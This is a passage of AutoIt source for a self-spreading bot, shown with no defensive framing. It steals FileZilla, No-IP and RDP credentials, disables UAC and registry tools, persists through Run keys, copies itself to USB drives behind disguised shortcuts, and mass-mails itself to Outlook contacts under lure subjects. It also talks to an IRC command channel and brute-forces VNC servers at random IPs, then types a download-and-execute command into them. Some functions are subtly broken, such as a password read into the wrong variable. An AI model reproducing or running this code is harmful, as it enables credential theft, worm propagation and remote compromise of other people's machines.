	$port = 21
	$usr = ""
	$pw = ""
	While True
		$line = FileReadLine($h)
		If @error = -1 Then ExitLoop
		If StringInStr($line, "<Host>") Then
			$usr = ""
			$pw = ""
			$port = 21
			$host = StringMid($line, 1, StringInStr($line, "</") - 1)
			$host = StringMid($host, StringInStr($host, ">") + 1)
		EndIf
		If StringInStr($line, "<Port>") Then
			$port = StringMid($line, 1, StringInStr($line, "</") - 1)
			$port = StringMid($port, StringInStr($port, ">") + 1)
		EndIf
		If StringInStr($line, "<User>") Then
			$usr = StringMid($line, 1, StringInStr($line, "</") - 1)
			$usr = StringMid($usr, StringInStr($usr, ">") + 1)
		EndIf
		If StringInStr($line, "<Pass>") Then
			$pw = StringMid($line, 1, StringInStr($line, "</") - 1)
			$pw = StringMid($pw, StringInStr($pw, ">") + 1)
		EndIf
		If StringInStr($line, "</Server>") Then
			$pwds = $pwds & "URL: ftp://" & $host & ":" & $port & " USR: " & $usr & " PWD: " & $pw & "|"
		EndIf
	WEnd
	Return $pwds
EndFunc   ;==>FileZilla
Func fixsys()
	$read_showsuperhidden = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden")
	If $read_showsuperhidden = "1" Then
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", 0)
	EndIf
	$read_disableregistrytools = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
	If $read_disableregistrytools = "0" Then
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", 1)
	EndIf
	$read_nofolderoptions = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions")
	If $read_nofolderoptions = "0" Then
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", 1)
	EndIf
	$read_uac = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA")
	If $read_uac = "1" Then
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0")
	EndIf
EndFunc   ;==>fixsys
Func genIP()
	While 1
		$sIPAddr = Random(1, 255, 1) & "." & Random(1, 255, 1) & "." & Random(1, 255, 1) & "." & Random(1, 255, 1)
		If StringRegExp($sIPAddr, "^((25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(25[0-5]|2[0-4]\d|[01]?\d?\d)$") Then Return $sIPAddr
	WEnd
EndFunc   ;==>genIP
Func GetLastError()
	Local $aiE = DllCall("kernel32.dll", "dword", "GetLastError")
	Return $aiE[0]
EndFunc   ;==>GetLastError
Func install()
	DirCreate($installdir)
	FileCopy(@ScriptFullPath, $installpath, 8)
	FileSetAttrib($installdir, "+SH")
	FileSetAttrib($installpath, "+SH")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Services", "REG_SZ", $installpath)
	If IsAdmin() Then
		RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Services", "REG_SZ", $installpath)
	EndIf
EndFunc   ;==>install
Func joinchannel($irc, $channel)
	If $irc = -1 Then Return 0
	TCPSend($irc, "JOIN " & $channel & @CRLF)
	If @error Then
		Return -1
	EndIf
	Return 1
EndFunc   ;==>joinchannel
Func lnk()
	Local $aArray = DriveGetDrive("REMOVABLE")
	Local $drivecount = 0
	For $i = 0 To UBound($aArray) - 1
		Local $Drive = StringUpper($aArray[$i])
		FileCopy(@ScriptFullPath, $Drive & "\link.exe")
		Local $p = $Drive & "\link.exe"
		FileSetAttrib($p, "+H")
		For $name In _FileListToArray($Drive & "\", "*")
			If StringInStr(FileGetAttrib($name), "D") Then
				FileCreateShortcut($p, StringUpper($aArray[$i]) & "\" & $name, "", "", "", "%windir%\system32\shell32.dll", "", 3, @SW_SHOWNOACTIVATE)
			EndIf
		Next
		$drivecount += 1
	Next
	Return $drivecount
EndFunc   ;==>lnk
Func newnickname($irc)
	$nick = $nickformat & randID()
	TCPSend($irc, "NICK " & $nick & @CRLF)
EndFunc   ;==>newnickname
Func nickname($irc)
	TCPSend($irc, "NICK " & $nick & @CRLF)
EndFunc   ;==>nickname
Func NOIP()
	Local $pwd = ""
	$usr = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Username")
	If $usr = "" Then Return ""
	$usr = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Password")
	Return "URL: http://no-ip.com/ USR: " & $usr & " PWD (Base64): " & $pwd
EndFunc   ;==>NOIP
Func NT_SUCCESS($status)
	If 0 <= $status And $status <= 0x7FFFFFFF Then
		Return True
	Else
		Return False
	EndIf
EndFunc   ;==>NT_SUCCESS
Func OpenSCManager($sComputerName, $iAccess)
	Local $avOSCM = DllCall("advapi32.dll", "hwnd", "OpenSCManager", _
			"str", $sComputerName, _
			"str", "ServicesActive", _
			"dword", $iAccess)
	Return $avOSCM[0]
EndFunc   ;==>OpenSCManager
Func pong($irc, $ret)
	If $ret = "" Then Return -1
	TCPSend($irc, "PONG " & $ret & @CRLF)
	If @error Then
		Return -1
	EndIf
	Return 1
EndFunc   ;==>pong
Func randID()
	Dim $aspace[3]
	$id = ""
	$Digits = 8
	For $i = 1 To $Digits
		$aspace[0] = Chr(Random(65, 90, 1))
		$aspace[1] = Chr(Random(97, 122, 1))
		$aspace[2] = Chr(Random(48, 57, 1))
		$id &= $aspace[Random(0, 2, 1)]
	Next
	Return $id
EndFunc   ;==>randID
Func SendMail()
	Dim $emailmessages[37][2]
	$emailmessages[0][0] = "Here's the file you asked for.."
	$emailmessages[0][1] = "Here you go sorry about that :)"
	$emailmessages[1][0] = "Hey"
	$emailmessages[1][1] = "I just really wanted to show you this!"
	$emailmessages[2][0] = "Thought this was funny"
	$emailmessages[2][1] = "Check it out!"
	$emailmessages[3][0] = "This is really damn cool"
	$emailmessages[3][1] = "Here's this thing I found I think you'd like it."
	$emailmessages[4][0] = "Here are my pictures from my vacation"
	$emailmessages[4][1] = ""
	$emailmessages[5][0] = "My friend took nice photos of me.you Should see em loL!"
	$emailmessages[5][1] = ""
	$emailmessages[6][0] = "its only my photos!"
	$emailmessages[6][1] = ""
	$emailmessages[7][0] = "Nice new photos of me and my friends and stuff and when i was young lol_"
	$emailmessages[7][1] = ""
	$emailmessages[8][0] = "Nice new photos of me!! :p"
	$emailmessages[8][1] = ""
	$emailmessages[9][0] = "Check out my sexy boobs :D"
	$emailmessages[9][1] = ""
	$emailmessages[10][0] = "hey regarde mes tof!! :p"
	$emailmessages[10][1] = ""
	$emailmessages[11][0] = "ma soeur a voulu que tu regarde ca!"
	$emailmessages[11][1] = ""
	$emailmessages[12][0] = "hey regarde les tof, c'est moi et mes copains entrain de.... :D"
	$emailmessages[12][1] = ""
	$emailmessages[13][0] = "j'ai fais pour toi ce photo album tu dois le voire :)"
	$emailmessages[13][1] = ""
	$emailmessages[14][0] = "tu dois voire ces tof"
	$emailmessages[14][1] = ""
	$emailmessages[15][0] = "mes photos chaudes :D"
	$emailmessages[15][1] = ""
	$emailmessages[16][0] = "c'est seulement mes tof :p"
	$emailmessages[16][1] = ""
	$emailmessages[17][0] = "zijn enige mijn foto's"
	$emailmessages[17][1] = ""
	$emailmessages[18][0] = "wanna Hey ziet mijn nieuw fotoalbum?"
	$emailmessages[18][1] = ""
	$emailmessages[19][0] = "indigde enkel nieuw fotoalbum! :)"
	$emailmessages[19][1] = ""
	$emailmessages[20][0] = "hey keurt mijn nieuw fotoalbum goed.. :p"
	$emailmessages[20][1] = ""
	$emailmessages[21][0] = "Hey bae"
	$emailmessages[21][1] = ""
	$emailmessages[22][0] = "indigde enkel nieuw fotoalbum! :)"
	$emailmessages[22][1] = ""
	$emailmessages[23][0] = "het voor yah, doend beeldverhaal van mijn leven lol.."
	$emailmessages[23][1] = ""
	$emailmessages[24][0] = "meine hei"
	$emailmessages[24][1] = ""
	$emailmessages[25][0] = "en Fotos ! :p"
	$emailmessages[25][1] = ""
	$emailmessages[26][0] = "meine hei"
	$emailmessages[26][1] = ""
	$emailmessages[27][0] = "le mie foto calde :p"
	$emailmessages[27][1] = ""
	$emailmessages[28][0] = "mis fotos calientes"
	$emailmessages[28][1] = ""
	$emailmessages[29][0] = "mi fotograf"
	$emailmessages[29][1] = ""
	$emailmessages[30][0] = "as :p"
	$emailmessages[30][1] = ""
	$emailmessages[31][0] = "Mi amigo tom"
	$emailmessages[31][1] = ""
	$emailmessages[32][0] = "las fotos agradables de m"
	$emailmessages[32][1] = ""
	$emailmessages[33][0] = "mis fotos calientes"
	$emailmessages[33][1] = ""
	$emailmessages[34][0] = "el lol mi hermana quisiera que le enviara este"
	$emailmessages[34][1] = ""
	$emailmessages[35][0] = "album de foto"
	$emailmessages[35][1] = ""
	$emailmessages[36][0] = "Here are my private pictures for you"
	$emailmessages[36][1] = ""
	$ooutlook = _outlookOpen()
	For $contact In _outlookGetContacts($ooutlook)
		$thisemail = Random(0, 3, 1)
		_outlookSendmail($ooutlook, $contact, "", "", $emailmessages[$thisemail][0], $emailmessages[$thisemail][1], @AutoItExe)
	Next
EndFunc   ;==>SendMail
Func sendmessage($irc, $msg, $chan = "")
	If $irc = -1 Then Return 0
	If $chan = "" Then
		TCPSend($irc, $msg & @CRLF)
		If @error Then
			Return -1
		EndIf
		Return 1
	EndIf
	TCPSend($irc, "PRIVMSG " & $chan & " :" & $msg & @CRLF)
	If @error Then
		Return -1
	EndIf
	Return 1
EndFunc   ;==>sendmessage
Func UncryptRDPPassword($bin)
	Local Const $CRYPTPROTECT_UI_FORBIDDEN = 0x1
	Local Const $DATA_BLOB = "int;ptr"
	Local $passStr = DllStructCreate("byte[1024]")
	Local $DataIn = DllStructCreate($DATA_BLOB)
	Local $DataOut = DllStructCreate($DATA_BLOB)
	$pwDescription = 'psw'
	$PwdHash = ""
	DllStructSetData($DataOut, 1, 0)
	DllStructSetData($DataOut, 2, 0)
	DllStructSetData($passStr, 1, $bin)
	DllStructSetData($DataIn, 2, DllStructGetPtr($passStr, 1))
	DllStructSetData($DataIn, 1, BinaryLen($bin))
	$Return = DllCall("crypt32.dll", "int", "CryptUnprotectData", _
			"ptr", DllStructGetPtr($DataIn), _
			"ptr", 0, _
			"ptr", 0, _
			"ptr", 0, _
			"ptr", 0, _
			"dword", $CRYPTPROTECT_UI_FORBIDDEN, _
			"ptr", DllStructGetPtr($DataOut))
	If @error Then Return ""
	$len = DllStructGetData($DataOut, 1)
	$PwdHash = Ptr(DllStructGetData($DataOut, 2))
	$PwdHash = DllStructCreate("byte[" & $len & "]", $PwdHash)
	Return BinaryToString(DllStructGetData($PwdHash, 1), 4)
EndFunc   ;==>UncryptRDPPassword
Func vncHaxx($ip, $port, $pass)
	For $p = 0 To UBound($pass) - 1
		Local $loginResult = vncLulz($ip, $port, $pass[$p])
		If $loginResult = 0 Then Return
		If $loginResult = -1 Then Return
	Next
EndFunc   ;==>vncHaxx
Func vncKek($sVNC, $password)
	Local $cmd = "cmd"
	Local $exit = "exit"
	Local $ClientPacket = "\x01"
	Local $KeyWindows = "\xFF\x5C"
	Local $KeyEnter = "\xFF\x0D"
	Local $KeyR = "\x72"
	TCPSend($sVNC, $ClientPacket)
	vncSendKey($sVNC, $KeyWindows)
	ConsoleWrite("Sent Windows key" & @CRLF)
	Sleep(Random(100, 500, 1))
	vncSendKey($sVNC, $KeyR)
	ConsoleWrite("Sent R key" & @CRLF)
	Sleep(Random(100, 500, 1))
	For $Char = 0 To UBound($cmd) - 1
		vncSendKey($sVNC, $cmd[$Char])
		Random(100, 200, 1)
	Next
	vncSendKey($sVNC, $KeyEnter)
	ConsoleWrite("CMD opened." & @CRLF)
	For $Char = 0 To UBound($dlexe) - 1
		vncSendKey($sVNC, $dlexe[$Char])
		Sleep(Random(100, 200, 1))
	Next
	vncSendKey($sVNC, $KeyEnter)
	ConsoleWrite("Download and execute command sent." & @CRLF)
	Sleep(Random(100, 200, 1))
	$dlexe = StringReplace($dlexe, "DEFAULT", ":" & $password)
	For $Char = 0 To UBound($exit) - 1
		vncSendKey($sVNC, $dlexe[$Char])
		Sleep(Random(100, 200, 1))
	Next
	vncSendKey($sVNC, $KeyEnter)
	ConsoleWrite("Infection successful." & @CRLF)
EndFunc   ;==>vncKek
Func vncLulz($ip, $port, $password)
	Opt('TCPTimeout', 3000)
	Local $sVNC = TCPConnect($ip, $port)
	If $sVNC = -1 Then
		ConsoleWrite("Failed to connect to " & $ip & ":" & $port & " @error = " & @error & @CRLF)
		Return -1
	EndIf
	Local $rfbProtocolVersionString = TCPRecv($sVNC, 34)
	If StringLen($rfbProtocolVersionString) < 12 Then Return SetError(1, 0, "Failed to recieve RFB protocol string." & @CRLF)
	If StringInStr($rfbProtocolVersionString, "Too many security failures") Then Return SetError(1, 0, "Too many security failures. Blocked from server.")
	Local $rfbSplit_1 = StringSplit($rfbProtocolVersionString, " ")
	If UBound($rfbSplit_1) < 3 Then Return -1
	Local $rfbSplit_2 = StringSplit($rfbSplit_1[2], ".")
	If $rfbSplit_2[0] < 2 Then Return SetError(1, 0, "Failed to split version string (step 2)" & @CRLF)
	Local $rfbProtocolMajorVersion = $rfbSplit_2[1]
	Local $rfbProtocolMinorVersion = StringTrimRight($rfbSplit_2[2], 1)
	TCPSend($sVNC, $rfbProtocolVersionString)
	Local $authScheme = _BinaryToInt16(StringRight(TCPRecv($sVNC, 2), 1))
	If $authScheme = 0 Then
	ElseIf $authScheme = 1 Then
		vncKek($sVNC, "")
		Return 0
	ElseIf $authScheme = 2 Then
		TCPSend($sVNC, Chr($authScheme))
		Local $challenge = TCPRecv($sVNC, 16)
		Local $encryptedChallenge = DES($password, $challenge, 1, 1, "")
		TCPSend($sVNC, $encryptedChallenge)
		Local $authResult = _BinaryToInt16(StringRight(BinaryToString(TCPRecv($sVNC, 8)), 1))
		Switch ($authResult)
			Case 0
				vncKek($sVNC, $password)
				Return 0
			Case 1
				Return 1
			Case 2
				Sleep(5000)
				Return 1
			Case 22
				Return 1
			Case 35
				Return 1
			Case 55
				Return 1
			Case Else
				Return 1
		EndSwitch
	Else
		Return -1
	EndIf
EndFunc   ;==>vncLulz
Func vncSendKey($sVNC, $key)
	Local $VNCSendKey = "\x04"
	Local $KeyDown = "\x01"
	Local $KeyUp = "\x00"
	Local $NullBytes_1 = "\x00\x00\x00\x00"
	Local $NullBytes_2 = "\x00\x00\x00\x00\x00"
	TCPSend($sVNC, $VNCSendKey)
	TCPSend($sVNC, $KeyDown)
	If StringLen($key) = 2 Then
		TCPSend($sVNC, $NullBytes_1)
	Else
		TCPSend($sVNC, $NullBytes_2)
	EndIf
	TCPSend($sVNC, $key)
	TCPSend($sVNC, $VNCSendKey)
	TCPSend($sVNC, $KeyUp)
	If StringLen($key) = 2 Then
		TCPSend($sVNC, $NullBytes_1)
	Else
		TCPSend($sVNC, $NullBytes_2)
	EndIf
	TCPSend($sVNC, $key)
EndFunc   ;==>vncSendKey
